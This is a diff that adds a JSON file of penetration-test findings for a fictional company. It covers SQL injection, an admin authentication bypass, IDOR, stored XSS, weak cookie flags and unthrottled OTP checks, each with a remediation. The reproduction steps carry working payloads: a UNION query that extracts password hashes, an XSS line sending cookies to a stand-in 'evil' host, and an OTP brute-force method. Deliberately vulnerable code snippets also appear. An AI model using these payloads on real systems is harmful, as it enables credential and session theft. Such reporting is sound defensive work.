@@ -1,0 +1,140 @@
+[
+  {
+    "id": "ARK-F-2025-0001",
+    "title": "SQL injection in product search endpoint",
+    "engagement": "ARK-E-2025-0001", "severity": "critical", "status": "verified",
+    "cvss": { "score": 9.8, "vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "version": "3.1" },
+    "cwe": ["CWE-89"], "owasp": "A03:2021 Injection", "category": "injection", "tags": ["sqli", "database", "unauthenticated"],
+    "reporter": "m-appsec", "assignee": "m-appsec", "discovered": "2025-09-10", "reported": "2025-09-10", "fixedAt": "2025-09-12", "verifiedAt": "2025-09-15",
+    "assets": ["ARK-A-2026-0001", "ARK-A-2026-0005"],
+    "affected": { "component": "Product search", "endpoint": "/api/search", "file": "packages/api/src/search.ts", "function": "searchProducts" },
+    "summary": "The product search endpoint built its database query by pasting the user's search term directly into SQL. An attacker could type database commands into the search box and read or change anything in the database — including every customer record — without logging in.",
+    "description": "The `q` parameter of `/api/search` is concatenated into a SQL query string. A single quote in the input breaks the query, confirming injection. UNION-based extraction retrieved the `users` table including password hashes.",
+    "impact": "Full read/write access to the primary database as an unauthenticated attacker: complete exposure of customer PII, credentials and orders, and the ability to tamper with records. This was the highest-risk issue found before launch.",
+    "stepsToReproduce": [
+      "Send GET /api/search?q=test' to the API",
+      "Observe a 500 error revealing a SQL syntax error",
+      "Submit q=test' UNION SELECT email,password_hash,3 FROM users-- ",
+      "Observe user credentials returned in the search results"
+    ],
+    "evidence": [
+      { "type": "code", "title": "Vulnerable query construction", "language": "typescript", "file": "packages/api/src/search.ts", "lines": [40, 47], "highlight": [43], "content": "async function searchProducts(q: string) {\n  const db = await pool.connect();\n  // BUG: user input concatenated straight into SQL\n  const sql =\n    \"SELECT id, name, price FROM products WHERE name LIKE '%\" + q + \"%'\";\n  const { rows } = await db.query(sql);\n  return rows;\n}" },
+      { "type": "request", "title": "UNION-based extraction", "content": "GET /api/search?q=x' UNION SELECT email,password_hash,3 FROM users-- - HTTP/1.1\nHost: api.arkstudios.example\nAccept: application/json" },
+      { "type": "screenshot", "title": "Credentials returned in response", "path": "sqli-response.svg", "description": "The search response contains user emails and bcrypt hashes extracted via UNION injection." }
+    ],
+    "remediation": {
+      "recommendation": "Use parameterised queries / prepared statements so user input is never interpreted as SQL. Never build queries by string concatenation. Add a least-privilege DB role for the API.",
+      "effort": "low", "owner": "m-appsec", "status": "verified", "verification": "Re-tested with sqlmap and manual payloads; injection no longer possible. Added a Semgrep rule to block string-concatenated queries in CI.",
+      "patch": "async function searchProducts(q: string) {\n  const db = await pool.connect();\n  const sql = 'SELECT id, name, price FROM products WHERE name ILIKE $1';\n  const { rows } = await db.query(sql, ['%' + q + '%']);\n  return rows;\n}",
+      "patchLanguage": "typescript"
+    },
+    "references": [{ "title": "OWASP SQL Injection Prevention", "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }],
+    "attack": { "class": "sql-injection", "vector": "network", "authRequired": "none", "reach": "organisation", "dataAtRisk": ["customer PII", "password hashes", "orders"], "financialExposure": 850000, "exploited": true },
+    "timeline": [
+      { "date": "2025-09-10", "type": "discovered", "by": "m-appsec" },
+      { "date": "2025-09-10", "type": "reported", "by": "m-appsec", "note": "Escalated immediately as pre-launch blocker" },
+      { "date": "2025-09-11", "type": "fix-started", "by": "m-appsec" },
+      { "date": "2025-09-12", "type": "fixed", "by": "m-appsec", "note": "Switched to parameterised queries" },
+      { "date": "2025-09-15", "type": "verified", "by": "m-appsec", "note": "Retested clean" }
+    ],
+    "effortHours": 6, "source": "manual"
+  },
+  {
+    "id": "ARK-F-2025-0002",
+    "title": "Authentication bypass on admin console",
+    "engagement": "ARK-E-2025-0003", "severity": "critical", "status": "fixed",
+    "cvss": { "score": 9.1, "version": "3.1" }, "cwe": ["CWE-287", "CWE-306"], "owasp": "A07:2021 Identification and Authentication Failures",
+    "category": "authentication", "tags": ["auth-bypass", "admin", "broken-auth"],
+    "reporter": "m-redteam", "assignee": "m-appsec", "discovered": "2025-11-13", "reported": "2025-11-13", "fixedAt": "2025-11-18",
+    "assets": ["ARK-A-2026-0009"],
+    "affected": { "component": "Admin console", "endpoint": "/admin", "file": "packages/web/middleware/requireAdmin.ts" },
+    "summary": "The internal admin console only checked whether someone was an admin on the front-end. By requesting admin pages directly, an outside attacker could reach the admin area and act as a support operator without ever logging in.",
+    "description": "The admin authorization check was enforced client-side only; the server rendered admin API routes without verifying the session role. Directly requesting `/admin/*` API routes returned privileged data.",
+    "impact": "An unauthenticated external attacker could access the admin console, view all customer accounts, and perform privileged operations (password resets, account changes).",
+    "stepsToReproduce": ["Browse to /admin without a session", "Front-end redirects to login, but the API at /api/admin/users responds 200", "Enumerate and modify user accounts via the admin API directly"],
+    "evidence": [
+      { "type": "code", "title": "Server route missing auth check", "language": "typescript", "file": "packages/api/src/routes/admin.ts", "lines": [10, 16], "highlight": [12], "content": "router.get('/api/admin/users', async (req, res) => {\n  // BUG: no server-side role check — relied on the SPA to hide the page\n  const users = await db.query('SELECT id, email, role FROM users');\n  res.json(users.rows);\n});" },
+      { "type": "request", "title": "Unauthenticated admin access", "content": "GET /api/admin/users HTTP/1.1\nHost: admin.arkstudios.example\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n[{\"id\":1,\"email\":\"...\",\"role\":\"admin\"}, ...]" }
+    ],
+    "remediation": { "recommendation": "Enforce authentication and role authorization server-side on every admin route with a centralised middleware. Fail closed. Add MFA for admin access.", "effort": "medium", "owner": "m-appsec", "status": "done", "verification": "All /api/admin/* routes now require a valid admin session; verified with automated tests." },
+    "attack": { "class": "auth-bypass", "vector": "network", "authRequired": "none", "reach": "organisation", "dataAtRisk": ["all customer accounts", "admin functions"], "financialExposure": 600000, "exploited": true },
+    "timeline": [
+      { "date": "2025-11-13", "type": "discovered", "by": "m-redteam" },
+      { "date": "2025-11-14", "type": "triaged", "by": "m-lead" },
+      { "date": "2025-11-18", "type": "fixed", "by": "m-appsec" }
+    ],
+    "effortHours": 10, "source": "manual"
+  },
+  {
+    "id": "ARK-F-2025-0003",
+    "title": "IDOR exposes other tenants' invoices",
+    "engagement": "ARK-E-2025-0003", "severity": "high", "status": "verified",
+    "cvss": { "score": 8.1, "version": "3.1" }, "cwe": ["CWE-639", "CWE-284"], "owasp": "A01:2021 Broken Access Control",
+    "category": "access-control", "tags": ["idor", "bola", "access-control"],
+    "reporter": "m-redteam", "assignee": "m-appsec", "discovered": "2025-11-15", "reported": "2025-11-15", "fixedAt": "2025-11-20", "verifiedAt": "2025-11-24",
+    "assets": ["ARK-A-2026-0002"],
+    "affected": { "component": "Billing", "endpoint": "/api/invoices/:id" },
+    "summary": "Any logged-in customer could read other customers' invoices simply by changing the invoice number in the web address. The system returned the document without checking that it belonged to the person asking.",
+    "description": "The `/api/invoices/:id` endpoint fetched an invoice by ID without verifying ownership against the authenticated user. Incrementing the ID returned other users' invoices, including names, addresses and amounts.",
+    "impact": "Bulk exposure of customer personal and financial data through simple ID enumeration — a full data-breach scenario with GDPR implications.",
+    "stepsToReproduce": ["Log in as a normal user", "Open your own invoice at /api/invoices/1001", "Change the ID to 1002, 1003, ...", "Observe other users' invoice data returned"],
+    "evidence": [
+      { "type": "code", "title": "No ownership check", "language": "typescript", "file": "packages/api/src/routes/invoices.ts", "lines": [8, 13], "highlight": [10], "content": "router.get('/api/invoices/:id', requireAuth, async (req, res) => {\n  // BUG: fetches by id but never checks it belongs to req.user\n  const inv = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);\n  res.json(inv.rows[0]);\n});" }
+    ],
+    "remediation": { "recommendation": "Scope every object lookup to the authenticated owner, e.g. add `AND user_id = $2`. Add automated authorization tests for horizontal access. Consider non-sequential IDs as defence in depth.", "effort": "low", "owner": "m-appsec", "status": "verified", "patch": "const inv = await db.query(\n  'SELECT * FROM invoices WHERE id = $1 AND user_id = $2',\n  [req.params.id, req.user.id]\n);\nif (!inv.rows[0]) return res.status(404).end();", "patchLanguage": "typescript" },
+    "attack": { "class": "idor", "vector": "network", "authRequired": "user", "reach": "organisation", "dataAtRisk": ["customer PII", "invoices"], "financialExposure": 400000 },
+    "effortHours": 5, "source": "manual"
+  },
+  {
+    "id": "ARK-F-2026-0004",
+    "title": "Stored XSS in support ticket messages",
+    "engagement": "ARK-E-2026-0005", "severity": "high", "status": "in-remediation",
+    "cvss": { "score": 7.4, "version": "3.1" }, "cwe": ["CWE-79"], "owasp": "A03:2021 Injection",
+    "category": "injection", "tags": ["xss", "stored", "cross-site-scripting"],
+    "reporter": "m-appsec", "assignee": "m-appsec", "discovered": "2026-01-14", "reported": "2026-01-14",
+    "assets": ["ARK-A-2026-0009"],
+    "affected": { "component": "Support tickets", "endpoint": "/admin/tickets/:id" },
+    "summary": "A customer can put hidden code inside a support message. When a support agent opens the ticket in the admin console, that code runs in the agent's browser — letting an attacker take over the agent's session.",
+    "description": "Ticket message bodies are rendered as raw HTML in the admin console. A payload such as `<img src=x onerror=...>` executes in the agent's authenticated context, enabling session theft and actions as the agent.",
+    "impact": "Escalation from a normal customer to an internal admin session: an attacker who files a malicious ticket can hijack a support agent and pivot to admin capabilities.",
+    "stepsToReproduce": ["Open a support ticket as a customer", "Set the message body to <img src=x onerror=fetch('//evil/'+document.cookie)>", "Wait for an agent to view the ticket", "Receive the agent's session cookie"],
+    "evidence": [{ "type": "code", "title": "Unsanitised render", "language": "tsx", "file": "packages/web/admin/Ticket.tsx", "lines": [22, 24], "highlight": [23], "content": "<div className=\"ticket-body\"\n  // BUG: renders attacker-controlled HTML\n  dangerouslySetInnerHTML={{ __html: message.body }} />" }],
+    "remediation": { "recommendation": "Render ticket content as text, or sanitise with a strict allow-list (DOMPurify). Add a Content-Security-Policy that blocks inline scripts. Set HttpOnly on session cookies.", "effort": "low", "owner": "m-appsec", "status": "in-progress", "eta": "2026-03-20" },
+    "attack": { "class": "xss", "vector": "network", "authRequired": "user", "reach": "multi-user", "dataAtRisk": ["agent sessions", "admin actions"] },
+    "effortHours": 4, "source": "manual"
+  },
+  {
+    "id": "ARK-F-2026-0005",
+    "title": "Session cookie missing HttpOnly and Secure flags",
+    "engagement": "ARK-E-2025-0001", "severity": "medium", "status": "fixed",
+    "cvss": { "score": 5.4, "version": "3.1" }, "cwe": ["CWE-1004", "CWE-614"], "owasp": "A05:2021 Security Misconfiguration",
+    "category": "session", "tags": ["session", "cookie", "misconfiguration"],
+    "reporter": "m-appsec", "assignee": "m-appsec", "discovered": "2025-09-11", "fixedAt": "2025-09-13",
+    "assets": ["ARK-A-2026-0001"],
+    "affected": { "component": "Session management", "file": "packages/api/src/session.ts" },
+    "summary": "The login session cookie was not marked HttpOnly or Secure, so it could be read by page scripts and sent over unencrypted connections — making session theft much easier if any other flaw (like XSS) exists.",
+    "description": "Session cookies lacked HttpOnly, Secure and SameSite attributes, increasing the impact of XSS and network interception.",
+    "impact": "Amplifies other issues: a session cookie readable by JavaScript turns any XSS into full account takeover.",
+    "evidence": [{ "type": "code", "title": "Insecure cookie options", "language": "typescript", "file": "packages/api/src/session.ts", "highlight": [3], "lines": [1, 5], "content": "res.cookie('sid', token, {\n  maxAge: 86400000,\n  // BUG: missing httpOnly / secure / sameSite\n});" }],
+    "remediation": { "recommendation": "Set httpOnly:true, secure:true and sameSite:'lax' on session cookies; shorten lifetime and rotate on privilege change.", "effort": "trivial", "owner": "m-appsec", "status": "done" },
+    "attack": { "class": "session-management", "vector": "network", "authRequired": "none", "reach": "multi-user", "dataAtRisk": ["sessions"] },
+    "effortHours": 1, "source": "manual"
+  },
+  {
+    "id": "ARK-F-2026-0006",
+    "title": "Missing rate limiting enables OTP brute force",
+    "engagement": "ARK-E-2026-0005", "severity": "high", "status": "open",
+    "cvss": { "score": 7.5, "version": "3.1" }, "cwe": ["CWE-307", "CWE-770"], "owasp": "A07:2021 Identification and Authentication Failures",
+    "category": "authentication", "tags": ["rate-limit", "brute-force", "otp"],
+    "reporter": "m-redteam", "assignee": "m-appsec", "discovered": "2026-02-20", "reported": "2026-02-20",
+    "assets": ["ARK-A-2026-0002"],
+    "affected": { "component": "Login MFA", "endpoint": "/api/auth/verify-otp" },
+    "summary": "The one-time-code check for login has no limit on attempts, so an attacker can rapidly try every 6-digit code until one works — defeating two-factor authentication.",
+    "description": "`/api/auth/verify-otp` accepts unlimited attempts with no lockout, backoff or CAPTCHA. A 6-digit OTP (1,000,000 combinations) is brute-forceable within the code's validity window at achievable request rates.",
+    "impact": "Two-factor authentication can be bypassed by brute force, undermining a key account-protection control.",
+    "stepsToReproduce": ["Trigger an OTP for a target account", "Script POSTs to /api/auth/verify-otp iterating 000000–999999", "No throttling; a valid code is accepted"],
+    "remediation": { "recommendation": "Enforce per-account and per-IP rate limits with exponential backoff, lock after N failures, expire OTPs quickly, and add anomaly detection.", "effort": "medium", "owner": "m-appsec", "status": "planned", "eta": "2026-03-25" },
+    "attack": { "class": "rate-limit", "vector": "network", "authRequired": "none", "reach": "multi-user", "dataAtRisk": ["accounts protected by MFA"] },
+    "effortHours": 3, "source": "manual"
+  }
+]
